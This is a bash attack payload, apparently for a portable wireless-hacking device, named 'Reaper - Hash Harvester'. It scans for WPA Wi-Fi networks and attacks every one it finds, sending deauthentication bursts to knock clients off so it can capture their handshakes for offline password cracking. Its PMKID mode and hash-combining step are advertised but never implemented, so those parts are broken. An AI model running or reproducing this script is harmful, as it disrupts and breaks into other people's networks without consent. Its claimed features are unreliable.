#!/bin/bash
# Title: Reaper - Hash Harvester
# Author: bad-antics
# Description: Automated WPA handshake and PMKID capture
# Category: nullsec/capture

LOOT_DIR="/mmc/nullsec/reaper"
mkdir -p "$LOOT_DIR"

PROMPT "REAPER - HASH HARVESTER

Automated capture of WPA
handshakes and PMKIDs.

Modes:
1. PMKID only (clientless)
2. Handshake (with deauth)
3. Full harvest (both)

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

PROMPT "HARVEST MODE:

1. PMKID only (fast)
2. Handshake capture
3. Full harvest (both)

Select mode next."

MODE=$(NUMBER_PICKER "Mode (1-3):" 3)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=3 ;; esac

DURATION_PER=$(NUMBER_PICKER "Seconds per target:" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION_PER=30 ;; esac

resp=$(CONFIRMATION_DIALOG "START HARVESTING?

Mode: $MODE
Per-target: ${DURATION_PER}s
Interface: $MON_IF

Will scan and attack all
WPA networks found.

Press OK to harvest.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
RESULTS_DIR="$LOOT_DIR/harvest_$TIMESTAMP"
mkdir -p "$RESULTS_DIR"

LOG "Scanning for WPA targets..."
SPINNER_START "Scanning for WPA networks..."
rm -f /tmp/reaper*
timeout 15 airodump-ng "$MON_IF" -w /tmp/reaper --output-format csv 2>/dev/null &
sleep 15
killall airodump-ng 2>/dev/null
SPINNER_STOP

grep -E "^[0-9A-Fa-f]{2}:" /tmp/reaper-01.csv 2>/dev/null | grep -iE "WPA" | head -10 > /tmp/reaper_targets.txt
TARGET_COUNT=$(wc -l < /tmp/reaper_targets.txt 2>/dev/null || echo 0)

[ "$TARGET_COUNT" -eq 0 ] && { ERROR_DIALOG "No WPA networks found!"; exit 1; }

LOG "Found $TARGET_COUNT WPA targets"
HANDSHAKE_COUNT=0
PMKID_COUNT=0

while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 x7 x8 x9 x10 x11 essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    channel=$(echo "$channel" | tr -d ' ')
    essid=$(echo "$essid" | sed 's/^[[:space:]]*//' | tr -cd '[:alnum:]_-')
    [ -z "$bssid" ] || [ -z "$channel" ] && continue
    [ -z "$essid" ] && essid="unknown"

    LOG "Target: $essid ($bssid CH:$channel)"
    iwconfig "$MON_IF" channel "$channel" 2>/dev/null

    # Handshake capture
    if [ "$MODE" = "2" ] || [ "$MODE" = "3" ]; then
        CAP_FILE="$RESULTS_DIR/${essid}_hs"
        airodump-ng -c "$channel" --bssid "$bssid" -w "$CAP_FILE" "$MON_IF" 2>/dev/null &
        DUMP_PID=$!
        sleep 5
        aireplay-ng -0 5 -a "$bssid" "$MON_IF" 2>/dev/null
        sleep 10
        aireplay-ng -0 5 -a "$bssid" "$MON_IF" 2>/dev/null
        sleep $((DURATION_PER - 15))
        kill $DUMP_PID 2>/dev/null
        killall aireplay-ng 2>/dev/null
        if [ -f "${CAP_FILE}-01.cap" ] && aircrack-ng "${CAP_FILE}-01.cap" 2>&1 | grep -q "1 handshake"; then
            HANDSHAKE_COUNT=$((HANDSHAKE_COUNT + 1))
            LOG "Handshake captured for $essid!"
        fi
    fi
done < /tmp/reaper_targets.txt

# Combine hashes
cat "$RESULTS_DIR"/*.22000 2>/dev/null | sort -u > "$RESULTS_DIR/all_hashes.22000"
TOTAL_HASHES=$(wc -l < "$RESULTS_DIR/all_hashes.22000" 2>/dev/null || echo 0)

killall airodump-ng aireplay-ng hcxdumptool 2>/dev/null
rm -f /tmp/reaper* 2>/dev/null

PROMPT "REAPER HARVEST COMPLETE

Targets attacked: $TARGET_COUNT
Handshakes: $HANDSHAKE_COUNT
PMKIDs: $PMKID_COUNT
Total hashes: $TOTAL_HASHES

Results: $RESULTS_DIR/

Press OK to exit."
